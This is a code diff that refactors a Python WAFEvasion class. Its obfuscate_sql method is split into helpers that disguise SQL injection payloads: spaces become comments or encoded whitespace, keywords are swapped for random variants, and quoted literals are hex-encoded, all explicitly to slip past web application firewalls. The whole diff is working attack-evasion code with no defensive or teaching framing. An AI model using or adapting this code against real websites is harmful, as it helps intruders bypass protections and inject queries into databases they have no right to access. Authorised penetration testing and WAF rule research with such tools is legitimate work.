@@ -39,47 +39,54 @@ class WAFEvasion:
             " ": ["/**/", "%09", "%0a", "%0b", "%0c", "%0d", "+"],
         }
 
+    def _obfuscate_whitespace(self, payload: str) -> str:
+        """Replace spaces with random comment-based evasion."""
+        method = secrets.choice(self.sql_keywords[" "])
+        return payload.replace(" ", method)
+
+    def _obfuscate_keywords(self, payload: str) -> str:
+        """Replace SQL keywords with obfuscated versions."""
+        obfuscated = payload
+        for kw, variations in self.sql_keywords.items():
+            if kw == " ":
+                continue
+            if kw not in obfuscated.upper():
+                continue
+            replacement = secrets.choice(variations)
+            idx = obfuscated.upper().find(kw)
+            while idx != -1:
+                obfuscated = obfuscated[:idx] + replacement + obfuscated[idx + len(kw):]
+                idx = obfuscated.upper().find(kw, idx + len(replacement))
+        return obfuscated
+
+    def _obfuscate_hex_encoding(self, payload: str) -> str:
+        """Encode string literals to hex for WAF bypass."""
+        if "'" not in payload:
+            return payload
+        parts = payload.split("'")
+        new_parts = []
+        for i, part in enumerate(parts):
+            if i % 2 == 1:  # Inside quotes
+                hex_val = "0x" + binascii.hexlify(part.encode()).decode()
+                new_parts.append(hex_val)
+            else:
+                new_parts.append(part)
+        return "".join(new_parts)
+
     def obfuscate_sql(self, payload: str, aggressiveness: int = 2) -> str:
         """Obfuscate SQL Injection payload.
         Aggressiveness: 1 (Basic) -> 3 (Extreme/Experimental).
         """
         obfuscated = payload
 
-        # 1. Whitespace Evasion (Space -> Comment)
         if aggressiveness >= 1:
-            method = secrets.choice(self.sql_keywords[" "])
-            obfuscated = obfuscated.replace(" ", method)
+            obfuscated = self._obfuscate_whitespace(obfuscated)
 
-        # 2. Keyword Pollution
         if aggressiveness >= 2:
-            for kw, variations in self.sql_keywords.items():
-                if kw == " ":
-                    continue
-                if kw in obfuscated.upper():
-                    # Pick a variation that is NOT the keyword itself
-                    replacement = secrets.choice(variations)
-                    # Case-insensitive replace via regex logic simulation
-                    idx = obfuscated.upper().find(kw)
-                    while idx != -1:
-                        obfuscated = (
-                            obfuscated[:idx] + replacement + obfuscated[idx + len(kw) :]
-                        )
-                        idx = obfuscated.upper().find(kw, idx + len(replacement))
+            obfuscated = self._obfuscate_keywords(obfuscated)
 
-        # 3. Hex Encoding (Standard WAF Bypass)
         if aggressiveness >= 3:
-            # Encode string literals: 'admin' -> 0x61646d696e
-            if "'" in obfuscated:
-                parts = obfuscated.split("'")
-                new_parts = []
-                for i, part in enumerate(parts):
-                    if i % 2 == 1:  # Inside quotes
-                        hex_val = "0x" + binascii.hexlify(part.encode()).decode()
-                        new_parts.append(hex_val)
-                    else:
-                        new_parts.append(part)
-                # Reconstruct without quotes for hex
-                obfuscated = "".join(new_parts)
+            obfuscated = self._obfuscate_hex_encoding(obfuscated)
 
         return obfuscated
 
